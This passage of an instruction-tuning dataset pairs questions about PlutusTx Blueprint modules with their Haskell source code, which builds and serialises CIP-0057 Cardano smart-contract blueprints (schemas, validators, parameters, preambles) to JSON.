referencedTypes where schema = SchemaBuiltInBoolean emptySchemaInfo instance HasBlueprintSchema BuiltinString referencedTypes where schema = SchemaBuiltInString emptySchemaInfo instance HasBlueprintSchema BuiltinByteString referencedTypes where schema = SchemaBytes emptySchemaInfo emptyBytesSchema instance HasBlueprintSchema ByteString referencedTypes where schema = SchemaBytes emptySchemaInfo emptyBytesSchema instance (HasBlueprintSchema a referencedTypes) => HasBlueprintSchema [a] referencedTypes where schema = SchemaList emptySchemaInfo ( MkListSchema { minItems = Nothing , maxItems = Nothing , uniqueItems = Nothing , itemSchema = schema @a } ) instance (HasBlueprintSchema a referencedTypes) => HasBlueprintSchema (BuiltinList a) referencedTypes where schema = SchemaBuiltInList emptySchemaInfo (schema @a) instance (HasBlueprintSchema a referencedTypes , HasBlueprintSchema b referencedTypes) => HasBlueprintSchema (BuiltinPair a b) referencedTypes where schema = SchemaBuiltInPair emptySchemaInfo (MkPairSchema (schema @a) (schema @b))" }
{"text": "<s>[inst]How does the \"ContractBlueprint\" data type in the \"PlutusTx.Blueprint.Contract\" module represent the Blueprint of a Cardano smart contract? What information is included in an instance of \"ContractBlueprint\", and how is it used to specify the contract's identifier, metadata, validator blueprints, and schema definitions? How does the \"ContractBlueprint\" data type conform to the CIP-0057 standard, and how does it facilitate the creation and specification of Cardano smart contracts?[/inst]{-# LANGUAGE DataKinds          #-}{-# LANGUAGE DerivingStrategies #-}{-# LANGUAGE GADTs              #-}{-# LANGUAGE KindSignatures     #-}{-# LANGUAGE OverloadedStrings  #-}{-# LANGUAGE RecordWildCards    #-}module PlutusTx.Blueprint.Contract where import Prelude import Data.Aeson (ToJSON (..), (.=)) import Data.Aeson qualified as Aeson import Data.Aeson.Extra (optionalField, requiredField) import Data.Aeson.Extra qualified as Aeson import Data.Map (Map) import Data.Map qualified as Map import Data.Set (Set) import Data.Text (Text) import PlutusPrelude (ensure) import PlutusTx.Blueprint.Definition (DefinitionId, Definitions, definitionsToMap) import PlutusTx.Blueprint.Preamble (Preamble) import PlutusTx.Blueprint.Validator (ValidatorBlueprint) {- | A blueprint of a smart contract, as defined by the CIP-0057 The 'referencedTypes' type variable is used to track the types used in the contract making sure their schemas are included in the blueprint and that they are referenced in a type-safe way. See Note [\"Unrolling\" types] for more details. -} data ContractBlueprint where MkContractBlueprint :: forall referencedTypes. { contractId :: Maybe Text -- ^ An optional identifier for the contract. , contractPreamble :: Preamble -- ^ An object with meta-information about the contract. , contractValidators :: Set (ValidatorBlueprint referencedTypes) -- ^ A set of validator blueprints that are part of the contract. , contractDefinitions :: Definitions referencedTypes -- ^ A registry of schema definitions used across the blueprint. } -> ContractBlueprint instance ToJSON ContractBlueprint where toJSON MkContractBlueprint{..} = Aeson.buildObject $ requiredField \"$schema\" schemaUrl . requiredField \"$vocabulary\" ( Aeson.object [ \"https://json-schema.org/draft/2020-12/vocab/core\" .= True , \"https://json-schema.org/draft/2020-12/vocab/applicator\" .= True , \"https://json-schema.org/draft/2020-12/vocab/validation\" .= True , \"https://cips.cardano.org/cips/cip57\" .= True ] ) . requiredField \"preamble\" contractPreamble . requiredField \"validators\" contractValidators . optionalField \"$id\" contractId . optionalField \"definitions\" definitions where schemaUrl :: String schemaUrl = \"https://cips.cardano.org/cips/cip57/schemas/plutus-blueprint.json\" definitions :: Maybe (Map DefinitionId Aeson.Value) definitions = ensure (not . Map.null) (definitionsToMap contractDefinitions toJSON)" }
{"text": "<s>[inst]How does the \"PlutusTx.Blueprint.Definition\" module help in working with the definition of schema-based data types in Plutus? What functionalities and modules are provided by the \"Definition\" module, and what are their respective uses (e.g., \"DefinitionId\" for defining unique identifiers, \"Unroll\" for unrolling nested data types, \"Internal\" for internal functions, and \"Derive\" for schema derivation)? How does this module assist developers in creating and managing schema-based data types for use in their Plutus contracts?[/inst]-- | This module provides a functionality to derive and reference schema definitions. module PlutusTx.Blueprint.Definition ( module DefinitionId , module Unroll , module Internal , module Derive ) where import PlutusTx.Blueprint.Definition.Derive as Derive import PlutusTx.Blueprint.Definition.Id as DefinitionId import PlutusTx.Blueprint.Definition.Internal as Internal import PlutusTx.Blueprint.Definition.Unroll as Unroll"}
{"text": "<s>[inst]How does the \"ParameterBlueprint\" data type in the \"PlutusTx.Blueprint.Parameter\" module define the Blueprint for a compile-time parameter of a validator? What fields are included in an instance of \"ParameterBlueprint\" and what information do they provide about the parameter's title, description, purpose, and schema? How is this data type used in the definition of a compile-time parameter and how does it facilitate the understanding and specification of validator parameters in a Plutus contract?[/inst]{-# LANGUAGE DataKinds          #-}\n{-# LANGUAGE DerivingStrategies #-}\n{-# LANGUAGE KindSignatures     #-}\n{-# LANGUAGE OverloadedStrings  #-}\n{-# LANGUAGE RecordWildCards    #-}\n\nmodule PlutusTx.Blueprint.Parameter where\n\nimport Prelude\n\nimport Data.Aeson (ToJSON (..), (.=))\nimport Data.Aeson qualified as Aeson\nimport Data.Aeson.Extra (buildObject, optionalField, requiredField)\nimport Data.Kind (Type)\nimport Data.Set (Set)\nimport Data.Set qualified as Set\nimport Data.Text (Text)\nimport PlutusTx.Blueprint.Purpose (Purpose)\nimport PlutusTx.Blueprint.Schema (Schema)\n\n{- | Blueprint that defines validator's compile-time parameter.\n\n  The 'referencedTypes' phantom type parameter is used to track the types used in the contract\n  making sure their schemas are included in the blueprint and that they are referenced\n  in a type-safe way.\n-}\ndata ParameterBlueprint (referencedTypes :: [Type]) = MkParameterBlueprint\n  { parameterTitle       :: Maybe Text\n  -- ^ A short and descriptive name for the parameter.\n  , parameterDescription :: Maybe Text\n  -- ^ An informative description of the parameter.\n  , parameterPurpose     :: Set Purpose\n  -- ^ One of \"spend\", \"mint\", \"withdraw\" or \"publish\", or a oneOf applicator of those.\n  , parameterSchema      :: Schema referencedTypes\n  -- ^ A Plutus Data Schema.\n  }\n  deriving stock (Show, Eq, Ord)\n\ninstance ToJSON (ParameterBlueprint referencedTypes) where\n  toJSON MkParameterBlueprint{..} =\n    buildObject $\n      requiredField \"schema\" parameterSchema\n        . optionalField \"title\" parameterTitle\n        . optionalField \"description\" parameterDescription\n        . optionalField \"purpose\" (oneOfASet parameterPurpose)\n\n----------------------------------------------------------------------------------------------------\n-- Helper functions --------------------------------------------------------------------------------\n\noneOfASet :: (ToJSON a) => Set a -> Maybe Aeson.Value\noneOfASet s =\n  case Set.toList s of\n    []  -> Nothing\n    [x] -> Just $ toJSON x\n    xs  -> Just $ Aeson.object [\"oneOf\" .= xs]"}
{"text": "<s>[inst]What is the \"PlutusVersion\" data type and how is it used in the \"PlutusTx.Blueprint.PlutusVersion\" module? What are the possible values of the \"PlutusVersion\" data type and how do they map to the corresponding Plutus Ledger Language versions? How is this data type related to the \"plutus-tx-plugin\" and how does it help ensure compatibility with the Plutus ledger language?[/inst]{-# LANGUAGE DerivingStrategies #-}\n{-# LANGUAGE LambdaCase         #-}\n{-# LANGUAGE OverloadedStrings  #-}\n\nmodule PlutusTx.Blueprint.PlutusVersion where\n\nimport Prelude\n\nimport Data.Aeson (ToJSON (..))\n\n{- | A \"Plutus Version\", as defined by the CIP-0057\n|\n| This version corresponds to the \"Plutus Ledger Language Version\"\n| defined by the plutus-tx-plugin.\n-}\ndata PlutusVersion = PlutusV1 | PlutusV2 | PlutusV3\n  deriving stock (Show)\n\ninstance ToJSON PlutusVersion where\n  toJSON = \\case\n    PlutusV1 -> \"v1\"\n    PlutusV2 -> \"v2\"\n    PlutusV3 -> \"v3\""}
{"text": "<s>[inst]What is the purpose of the \"Preamble\" data type in the \"PlutusTx.Blueprint.Preamble\" module? What meta-information does it provide about a Cardano smart contract, including its title, description, version, Plutus version, and license? How is the \"ToJSON\" instance of the \"Preamble\" data type derived and how does it facilitate the representation of the contract's meta-information in a JSON format?[/inst]{-# LANGUAGE DerivingStrategies #-}\n{-# LANGUAGE LambdaCase         #-}\n{-# LANGUAGE TemplateHaskell    #-}\n\nmodule PlutusTx.Blueprint.Preamble where\n\nimport Prelude\n\nimport Data.Aeson (Options (..), defaultOptions)\nimport Data.Aeson.Extra (stripPrefix)\nimport Data.Aeson.TH (deriveToJSON)\nimport Data.Text (Text)\nimport GHC.Generics (Generic)\nimport PlutusTx.Blueprint.PlutusVersion (PlutusVersion)\n\n-- | Meta-information about the contract\ndata Preamble = MkPreamble\n  { preambleTitle         :: Text\n  -- ^ A short and descriptive title of the contract application\n  , preambleDescription   :: Maybe Text\n  -- ^ A more elaborate description\n  , preambleVersion       :: Text\n  -- ^ A version number for the project.\n  , preamblePlutusVersion :: PlutusVersion\n  -- ^ The Plutus version assumed for all validators\n  , preambleLicense       :: Maybe Text\n  -- ^ A license under which the specification\n  -- and contract code is distributed\n  }\n  deriving stock (Show, Generic)\n\n$(deriveToJSON defaultOptions{fieldLabelModifier = stripPrefix \"preamble\"} ''Preamble)"}
{"text": "<s>[inst]What is the role of the \"Purpose\" data type in the \"PlutusTx.Blueprint.Purpose\" module? What are the four possible values for the \"Purpose\" data type (\"Spend\", \"Mint\", \"Withdraw\", and \"Publish\"), and what do they indicate about the context in which validator arguments or parameters are used? How is the \"Purpose\" data type related to the specification of validator arguments and parameters in a Plutus contract?[/inst]{-# LANGUAGE DerivingStrategies #-}\n{-# LANGUAGE LambdaCase         #-}\n{-# LANGUAGE OverloadedStrings  #-}\n\nmodule PlutusTx.Blueprint.Purpose where\n\nimport Prelude\n\nimport Data.Aeson (ToJSON (..))\nimport Data.Aeson qualified as Json\nimport Data.Text (Text)\nimport Language.Haskell.TH.Syntax (Lift)\n\n{- |\n  As per CIP-57, a validator arguments (redeemer, datum) and validator parameters\n  all must specify a purpose that indicates in which context they are used.\n-}\ndata Purpose = Spend | Mint | Withdraw | Publish\n  deriving stock (Eq, Ord, Show, Lift)\n\ninstance ToJSON Purpose where\n  toJSON = Json.String . purposeToText\n\npurposeToText :: Purpose -> Text\npurposeToText = \\case\n  Spend    -> \"spend\"\n  Mint     -> \"mint\"\n  Withdraw -> \"withdraw\"\n  Publish  -> \"publish\""}
{"text": "<s>[inst]What is the role of the \"Schema\" data type in the \"PlutusTx.Blueprint.Schema\" module? How does the \"Schema\" data type represent Plutus schema definitions, as specified in CIP-0057, using constructors such as \"SchemaInteger\", \"SchemaBytes\", and \"SchemaList\"? How are these different schemas used to specify the properties and constraints of Plutus data types, and how does this data type facilitate the definition and management of schemas for Plutus contracts?[/inst]{-# LANGUAGE AllowAmbiguousTypes   #-}{-# LANGUAGE DataKinds             #-}{-# LANGUAGE DeriveAnyClass        #-}{-# LANGUAGE DeriveDataTypeable    #-}{-# LANGUAGE DerivingStrategies    #-}{-# LANGUAGE DuplicateRecordFields #-}{-# LANGUAGE LambdaCase            #-}{-# LANGUAGE NamedFieldPuns        #-}{-# LANGUAGE OverloadedStrings     #-}{-# LANGUAGE PolyKinds             #-}{-# LANGUAGE RecordWildCards       #-}{-# LANGUAGE TypeFamilies          #-}{-# LANGUAGE UndecidableInstances  #-}module PlutusTx.Blueprint.Schema where import Control.Lens.Plated (Plated) import Data.Aeson (ToJSON (..), (.=)) import Data.Aeson qualified as Aeson import Data.Aeson.Extra (optionalField, requiredField) import Data.Aeson.KeyMap qualified as KeyMap import Data.ByteString (ByteString) import Data.ByteString.Base16 qualified as Base16 import Data.Data (Data, Typeable) import Data.Function ((&)) import Data.Kind (Type) import Data.List.NonEmpty (NonEmpty, nonEmpty) import Data.Text (Text) import Data.Text.Encoding qualified as Text import GHC.Generics (Generic) import Numeric.Natural (Natural) import PlutusTx.Blueprint.Definition.Id (DefinitionId, definitionIdToText) import PlutusTx.Blueprint.Schema.Annotation (SchemaInfo, comment, description, title) import Prelude hiding (max, maximum, min, minimum) data Schema (referencedTypes :: [Type]) = SchemaInteger SchemaInfo IntegerSchema | SchemaBytes SchemaInfo BytesSchema | SchemaList SchemaInfo (ListSchema referencedTypes) | SchemaMap SchemaInfo (MapSchema referencedTypes) | SchemaConstructor SchemaInfo (ConstructorSchema referencedTypes) | SchemaBuiltInData SchemaInfo | SchemaBuiltInUnit SchemaInfo | SchemaBuiltInBoolean SchemaInfo | SchemaBuiltInInteger SchemaInfo | SchemaBuiltInBytes SchemaInfo | SchemaBuiltInString SchemaInfo | SchemaBuiltInPair SchemaInfo (PairSchema referencedTypes) | SchemaBuiltInList SchemaInfo (Schema referencedTypes) | SchemaOneOf (NonEmpty (Schema referencedTypes)) | SchemaAnyOf (NonEmpty (Schema referencedTypes)) | SchemaAllOf (NonEmpty (Schema referencedTypes)) | SchemaNot (Schema referencedTypes) | SchemaDefinitionRef DefinitionId deriving stock (Eq, Ord, Show, Generic, Data) deriving anyclass instance (Typeable referencedTypes) => Plated (Schema referencedTypes) instance ToJSON (Schema referencedTypes) where toJSON = \\case SchemaInteger info MkIntegerSchema{..} -> dataType info \"integer\" & optionalField \"multipleOf\" multipleOf & optionalField \"minimum\" minimum & optionalField \"maximum\" maximum & optionalField \"exclusiveMinimum\" exclusiveMinimum & optionalField \"exclusiveMaximum\" exclusiveMaximum & Aeson.Object SchemaBytes info MkBytesSchema{..} -> dataType info \"bytes\" & optionalField \"enum\" (fmap toHex <$> nonEmpty enum) & optionalField \"maxLength\" maxLength & optionalField \"minLength\" minLength & Aeson.Object where toHex :: ByteString -> Text toHex = Text.decodeUtf8 . Base16.encode SchemaList info MkListSchema{..} -> dataType info \"list\" & requiredField \"items\" itemSchema & optionalField \"minItems\" minItems & optionalField \"maxItems\" maxItems & optionalField \"uniqueItems\" uniqueItems & Aeson.Object SchemaMap info MkMapSchema{..} -> dataType info \"map\" & requiredField \"keys\" keySchema & requiredField \"values\" valueSchema & optionalField \"minItems\" minItems & optionalField \"maxItems\" maxItems & Aeson.Object SchemaConstructor info MkConstructorSchema{..} -> dataType info \"constructor\" & requiredField \"index\" index & requiredField \"fields\" fieldSchemas & Aeson.Object SchemaBuiltInData info -> Aeson.Object $ infoFields info SchemaBuiltInUnit info -> Aeson.Object $ dataType info \"#unit\" SchemaBuiltInBoolean info -> Aeson.Object $ dataType info \"#boolean\" SchemaBuiltInInteger info -> Aeson.Object $ dataType info \"#integer\" SchemaBuiltInBytes info -> Aeson.Object $ dataType info \"#bytes\" SchemaBuiltInString info -> Aeson.Object $ dataType info \"#string\" SchemaBuiltInPair info MkPairSchema{left, right} -> dataType info \"#pair\" & requiredField \"left\" left & requiredField \"right\" right & Aeson.Object SchemaBuiltInList info schema -> dataType info \"#list\" & requiredField \"items\" schema & Aeson.Object SchemaOneOf schemas -> Aeson.object [\"oneOf\" .= schemas] SchemaAnyOf schemas -> Aeson.object [\"anyOf\" .= schemas] SchemaAllOf schemas -> Aeson.object [\"allOf\" .= schemas] SchemaNot schema -> Aeson.object [\"not\" .= schema] SchemaDefinitionRef definitionId -> Aeson.object [\"$ref\" .= (\"#/definitions/\" <> definitionIdToText definitionId)] where dataType :: SchemaInfo -> String -> Aeson.Object dataType info ty = requiredField \"dataType\" ty (infoFields info) infoFields :: SchemaInfo -> Aeson.Object infoFields info = KeyMap.empty & optionalField \"title\" (title info) & optionalField \"description\" (description info) & optionalField \"$comment\" (comment info) withSchemaInfo :: (SchemaInfo -> SchemaInfo) -> Schema referencedTypes -> Schema referencedTypes withSchemaInfo f = \\case SchemaInteger info schema -> SchemaInteger (f info) schema SchemaBytes info schema -> SchemaBytes (f info) schema SchemaList info schema -> SchemaList (f info) schema SchemaMap info schema -> SchemaMap (f info) schema SchemaConstructor info schema -> SchemaConstructor (f info) schema SchemaBuiltInData info -> SchemaBuiltInData (f info) SchemaBuiltInUnit info -> SchemaBuiltInUnit (f info) SchemaBuiltInBoolean info -> SchemaBuiltInBoolean (f info) SchemaBuiltInInteger info -> SchemaBuiltInInteger (f info) SchemaBuiltInBytes info -> SchemaBuiltInBytes (f info) SchemaBuiltInString info -> SchemaBuiltInString (f info) SchemaBuiltInPair info schema -> SchemaBuiltInPair (f info) schema SchemaBuiltInList info schema -> SchemaBuiltInList (f info) schema SchemaOneOf schemas -> SchemaOneOf schemas SchemaAnyOf schemas -> SchemaAnyOf schemas SchemaAllOf schemas -> SchemaAllOf schemas SchemaNot schema -> SchemaNot schema SchemaDefinitionRef definitionId -> SchemaDefinitionRef definitionId data IntegerSchema = MkIntegerSchema { multipleOf :: Maybe Integer , minimum :: Maybe Integer , maximum :: Maybe Integer , exclusiveMinimum :: Maybe Integer , exclusiveMaximum :: Maybe Integer } deriving stock (Eq, Ord, Show, Generic, Data) emptyIntegerSchema :: IntegerSchema emptyIntegerSchema = MkIntegerSchema { multipleOf = Nothing , minimum = Nothing , maximum = Nothing , exclusiveMinimum = Nothing , exclusiveMaximum = Nothing } data BytesSchema = MkBytesSchema { enum :: [ByteString] , minLength :: Maybe Natural , maxLength :: Maybe Natural } deriving stock (Eq, Ord, Show, Generic, Data) emptyBytesSchema :: BytesSchema emptyBytesSchema = MkBytesSchema{enum = [], minLength = Nothing, maxLength = Nothing} data ListSchema (referencedTypes :: [Type]) = MkListSchema { itemSchema :: Schema referencedTypes , minItems :: Maybe Natural , maxItems :: Maybe Natural , uniqueItems :: Maybe Bool } deriving stock (Eq, Ord, Show, Generic, Data) mkListSchema :: Schema referencedTypes -> ListSchema referencedTypes mkListSchema itemSchema = MkListSchema { itemSchema , minItems = Nothing , maxItems = Nothing , uniqueItems = Nothing } data MapSchema (referencedTypes :: [Type]) = MkMapSchema { keySchema :: Schema referencedTypes , valueSchema :: Schema referencedTypes , minItems :: Maybe Natural , maxItems :: Maybe Natural } deriving stock (Eq, Ord, Show, Generic, Data) data ConstructorSchema (referencedTypes :: [Type]) = MkConstructorSchema { index :: Natural , fieldSchemas :: [Schema referencedTypes] } deriving stock (Eq, Ord, Show, Generic, Data) data PairSchema (referencedTypes :: [Type]) = MkPairSchema { left :: Schema referencedTypes , right :: Schema referencedTypes } deriving stock (Eq, Ord, Show, Generic, Data)}</s>"}
{"text": "<s>[inst]How do the functions \"makeIsDataSchemaIndexed\" and \"unstableMakeIsDataSchema\" in the \"PlutusTx.Blueprint.TH\" module generate Plutus schema-related instances for Haskell data types? What is the difference between these two functions, and when should each be used? How does the \"makeIsDataSchemaIndexed\" function allow for explicit control over the mapping of constructor names to indices, and why is this important when stability of representation is required?[/inst]{-# LANGUAGE CPP              #-} {-# LANGUAGE EmptyCase        #-} {-# LANGUAGE LambdaCase       #-} {-# LANGUAGE NamedFieldPuns   #-} {-# LANGUAGE RecordWildCards  #-} {-# LANGUAGE TemplateHaskell  #-} {-# LANGUAGE TupleSections    #-} {-# LANGUAGE TypeApplications #-} {-# LANGUAGE ViewPatterns     #-} module PlutusTx.Blueprint.TH where import Prelude import Data.Data (Data) import Data.List (nub) import Data.List.NonEmpty qualified as NE import Data.Set (Set) import Data.Text qualified as Text import GHC.Natural (naturalToInteger) import Language.Haskell.TH qualified as TH import Language.Haskell.TH.Datatype qualified as TH import Numeric.Natural (Natural) import PlutusPrelude (for, join, (<&>), (<<$>>)) import PlutusTx.Blueprint.Argument (ArgumentBlueprint (..)) import PlutusTx.Blueprint.Class (HasBlueprintSchema (..)) import PlutusTx.Blueprint.Definition.Internal (HasSchemaDefinition) import PlutusTx.Blueprint.Definition.Unroll (HasBlueprintDefinition) import PlutusTx.Blueprint.Parameter (ParameterBlueprint (..)) import PlutusTx.Blueprint.Purpose (Purpose) import PlutusTx.Blueprint.Schema (ConstructorSchema (..), Schema (..)) import PlutusTx.Blueprint.Schema.Annotation (SchemaAnn (..), SchemaComment, SchemaDescription, SchemaInfo (..), SchemaTitle, annotationsToSchemaInfo, schemaDescriptionToString, schemaTitleToString) import PlutusTx.IsData.TH (makeIsDataIndexed) {- | Generate a 'ToData', 'FromData', 'UnsafeFromData', 'HasBlueprintSchema' instances for a type, using an explicit mapping of constructor names to indices. Use this for types where you need to keep the representation stable. -} makeIsDataSchemaIndexed :: TH.Name -> [(TH.Name, Natural)] -> TH.Q [TH.InstanceDec] makeIsDataSchemaIndexed dataTypeName indices = do dataInstances <- makeIsDataIndexed dataTypeName (fmap fromIntegral <$> indices) hasSchemaInstance <- makeHasSchemaInstance dataTypeName indices pure $ hasSchemaInstance ++ dataInstances unstableMakeIsDataSchema :: TH.Name -> TH.Q [TH.Dec] unstableMakeIsDataSchema name = do info <- TH.reifyDatatype name let defaultIndex = zip (TH.constructorName <$> TH.datatypeCons info) [0..] makeIsDataSchemaIndexed name defaultIndex makeHasSchemaInstance :: TH.Name -> [(TH.Name, Natural)] -> TH.Q [TH.InstanceDec] makeHasSchemaInstance dataTypeName indices = do dataTypeInfo <- TH.reifyDatatype dataTypeName let appliedType = TH.datatypeType dataTypeInfo let nonOverlapInstance = TH.InstanceD Nothing -- Lookup indices for all constructors of a data type. indexedCons :: [(TH.ConstructorInfo, SchemaInfo, Natural)] <- do for (TH.datatypeCons dataTypeInfo) $ \ctorInfo -> do let ctorName = TH.constructorName ctorInfo case lookup ctorName indices of Nothing -> fail $ \"No index given for constructor \" ++ show (TH.constructorName ctorInfo) Just index -> do ctorSchemaAnns <- lookupSchemaAnns ctorName schemaInfo <- schemaInfoFromAnns ctorSchemaAnns pure (ctorInfo, schemaInfo, index) let referencedTypes = TH.VarT (TH.mkName \"referencedTypes\") -- Generate constraints for the instance. let constraints = nub . join $ -- Every type in the constructor fields must have a schema definition. [ ( case fieldType of TH.VarT {} -> (TH.classPred ''HasBlueprintDefinition [fieldType] :) _ -> id ) [ TH.classPred ''HasSchemaDefinition [fieldType, referencedTypes] ] | (TH.ConstructorInfo{constructorFields}, _info, _index) <- indexedCons , fieldType <- constructorFields ] -- Generate a 'schema' function for the instance with one clause. schemaPrag <- TH.funD 'schema [mkSchemaClause referencedTypes indexedCons] -- Generate a pragma for the 'schema' function, making it inlinable. schemaDecl <- TH.pragInlD 'schema TH.Inlinable TH.FunLike TH.AllPhases pure -- Generate an instance declaration, e.g.: -- instance (constraints) => HasBlueprintSchema T referencedTypes where -- {-# INLINE schema #-} -- schema = ... [ nonOverlapInstance constraints (TH.classPred ''HasBlueprintSchema [appliedType, referencedTypes]) [schemaPrag, schemaDecl] ] where -- Lookup all annotations (SchemaTitle, SchemdDescription, SchemaComment) attached to a name. lookupSchemaAnns :: TH.Name -> TH.Q [SchemaAnn] lookupSchemaAnns name = do title <- MkSchemaAnnTitle <<$>> lookupAnn @SchemaTitle name description <- MkSchemaAnnDescription <<$>> lookupAnn @SchemaDescription name comment <- MkSchemaAnnComment <<$>> lookupAnn @SchemaComment name pure $ title ++ description ++ comment -- | Make SchemaInfo from a list of schema annotations, failing in case of ambiguity. schemaInfoFromAnns :: [SchemaAnn] -> TH.Q SchemaInfo schemaInfoFromAnns = either fail pure . annotationsToSchemaInfo -- | Make a clause for the 'schema' function. mkSchemaClause :: -- | The type for the 'HasBlueprintSchema' instance. TH.Type -> -- | The constructors of the type with their schema infos and indices. [(TH.ConstructorInfo, SchemaInfo, Natural)] -> -- | The clause for the 'schema' function. TH.ClauseQ mkSchemaClause ts ctorIndexes = case ctorIndexes of [] -> fail \"At least one constructor index must be specified.\" [ctorIndex] -> mkBody (mkSchemaConstructor ctorIndex) _ -> mkBody [|SchemaOneOf (NE.fromList $(TH.listE (map mkSchemaConstructor ctorIndexes)))|] where mkBody :: TH.ExpQ -> TH.ClauseQ mkBody body = do let patterns = [] let whereDecls = [] TH.clause patterns (TH.normalB body) whereDecls mkSchemaConstructor :: (TH.ConstructorInfo, SchemaInfo, Natural) -> TH.ExpQ mkSchemaConstructor (TH.ConstructorInfo{..}, info, naturalToInteger -> ctorIndex) = do fields <- for constructorFields $ \t -> [|definitionRef @($(pure t)) @($(pure ts))|] [|SchemaConstructor info (MkConstructorSchema ctorIndex $(pure (TH.ListE fields)))|] deriveParameterBlueprint :: TH.Name -> Set Purpose -> TH.ExpQ deriveParameterBlueprint tyName purpose = do title <- Text.pack . schemaTitleToString <<$>> lookupSchemaTitle tyName description <- Text.pack . schemaDescriptionToString <<$>> lookupSchemaDescription tyName [| MkParameterBlueprint { parameterTitle = title , parameterDescription = description , parameterPurpose = purpose , parameterSchema = definitionRef @($(TH.conT tyName)) } |] deriveArgumentBlueprint :: TH.Name -> Set Purpose -> TH.ExpQ deriveArgumentBlueprint tyName purpose = do title <- Text.pack . schemaTitleToString <<$>> lookupSchemaTitle tyName description <- Text.pack . schemaDescriptionToString <<$>> lookupSchemaDescription tyName [| MkArgumentBlueprint { argumentTitle = title , argumentDescription = description , argumentPurpose = purpose , argumentSchema = definitionRef @($(TH.conT tyName)) } |] ---------------------------------------------------------------------------------------------------- -- TH Utilities ------------------------------------------------------------------------------------ lookupAnn :: (Data a) => TH.Name -> TH.Q [a] lookupAnn = TH.reifyAnnotations . TH.AnnLookupName lookupSchemaTitle :: TH.Name -> TH.Q (Maybe SchemaTitle) lookupSchemaTitle tyName = lookupAnn @SchemaTitle tyName <&> \case [x] -> Just x [] -> Nothing _ -> fail $ \"Multiple SchemTitle annotations found for \" <> show tyName lookupSchemaDescription :: TH.Name -> TH.Q (Maybe SchemaDescription) lookupSchemaDescription tyName = lookupAnn @SchemaDescription tyName <&> \case [x] -> Just x [] -> Nothing _ -> fail $ \"Multiple SchemaDescription annotations found for \" <> show tyName</s>"}
{"text": "<s>[inst]What is the role of the \"ValidatorBlueprint\" data type in the \"PlutusTx.Blueprint.Validator\" module? How does this data type represent the blueprint of a Plutus validator, as defined in CIP-0057, by specifying properties and parameters such as \"validatorTitle\", \"validatorRedeemer\", and \"validatorCompiled\"? How does this data type help developers to define, manage, and deploy Plutus validators, and what are the advantages of using a data-driven approach to validator management in Cardano smart contracts?[/inst]{-# LANGUAGE DataKinds          #-}{-# LANGUAGE DerivingStrategies #-}{-# LANGUAGE KindSignatures     #-}{-# LANGUAGE LambdaCase         #-}{-# LANGUAGE OverloadedStrings  #-}{-# LANGUAGE RecordWildCards    #-}module PlutusTx.Blueprint.Validator where import Prelude import Data.Aeson (ToJSON (..)) import Data.Aeson.Extra (buildObject, optionalField, requiredField) import Data.ByteString (ByteString) import Data.ByteString qualified as BS import Data.ByteString.Base16 qualified as Base16 import Data.Kind (Type) import Data.List.NonEmpty qualified as NE import Data.Text (Text) import Data.Text.Encoding qualified as Text import PlutusCore.Crypto.Hash (blake2b_224) import PlutusTx.Blueprint.Argument (ArgumentBlueprint) import PlutusTx.Blueprint.Parameter (ParameterBlueprint) import PlutusTx.Blueprint.PlutusVersion (PlutusVersion (..)) {- | A blueprint of a validator, as defined by the CIP-0057 The 'referencedTypes' phantom type parameter is used to track the types used in the contract making sure their schemas are included in the blueprint and that they are referenced in a type-safe way. -} data ValidatorBlueprint (referencedTypes :: [Type]) = MkValidatorBlueprint { validatorTitle       :: Text , validatorDescription :: Maybe Text , validatorRedeemer    :: ArgumentBlueprint referencedTypes , validatorDatum       :: Maybe (ArgumentBlueprint referencedTypes) , validatorParameters  :: [ParameterBlueprint referencedTypes] , validatorCompiled    :: Maybe CompiledValidator } deriving stock (Show, Eq, Ord) data CompiledValidator = MkCompiledValidator { compiledValidatorCode :: ByteString , compiledValidatorHash :: ByteString } deriving stock (Show, Eq, Ord) compiledValidator :: PlutusVersion -> ByteString -> CompiledValidator compiledValidator version code = MkCompiledValidator { compiledValidatorCode = code , compiledValidatorHash = blake2b_224 (BS.singleton (versionTag version) <> code) } where versionTag = \\case PlutusV1 -> 0x1 PlutusV2 -> 0x2 PlutusV3 -> 0x3 instance ToJSON (ValidatorBlueprint referencedTypes) where toJSON MkValidatorBlueprint{..} = buildObject $ requiredField \"title\" validatorTitle . requiredField \"redeemer\" validatorRedeemer . optionalField \"description\" validatorDescription . optionalField \"datum\" validatorDatum . optionalField \"parameters\" (NE.nonEmpty validatorParameters) . optionalField \"compiledCode\" (toHex . compiledValidatorCode <$> validatorCompiled) . optionalField \"hash\" (toHex . compiledValidatorHash <$> validatorCompiled) where toHex :: ByteString -> Text toHex = Text.decodeUtf8 . Base16.encode</s>"}
{"text": "<s>[inst]How do the \"PlutusTx.Blueprint.Write\" functions \"encodeBlueprint\" and \"writeBlueprint\" work to convert and write \"ContractBlueprint\" data structures to files? What is the role of the \"encodeBlueprint\" function in encoding a \"ContractBlueprint\" to a JSON-formatted \"LBS.ByteString\", and how does this function use the \"Data.Aeson\" library and the \"Pretty\" encoding method?[/inst]{-# LANGUAGE OverloadedStrings #-}module PlutusTx.Blueprint.Write ( encodeBlueprint, writeBlueprint, ) where import Data.Aeson (toJSON) import Data.Aeson.Encode.Pretty (encodePretty') import Data.Aeson.Encode.Pretty qualified as Pretty import Data.ByteString.Lazy qualified as LBS import PlutusTx.Blueprint.Contract (ContractBlueprint) import Prelude writeBlueprint :: FilePath -> ContractBlueprint -> IO () writeBlueprint f blueprint = LBS.writeFile f (encodeBlueprint blueprint) encodeBlueprint :: ContractBlueprint -> LBS.ByteString encodeBlueprint = encodePretty' Pretty.defConfig { Pretty.confIndent = Pretty.Spaces 2 , Pretty.confCompare = Pretty.keyOrder [ \"$id\" , \"$schema\" , \"$vocabulary\" , \"preamble\" , \"validators\" , \"definitions\" , \"title\" , \"description\" , \"version\" , \"plutusVersion\" , \"license\" , \"redeemer\" , \"datum\" , \"parameters\" , \"purpose\" , \"schema\" ] , Pretty.confNumFormat = Pretty.Generic , Pretty.confTrailingNewline = True } . toJSON</s>"}
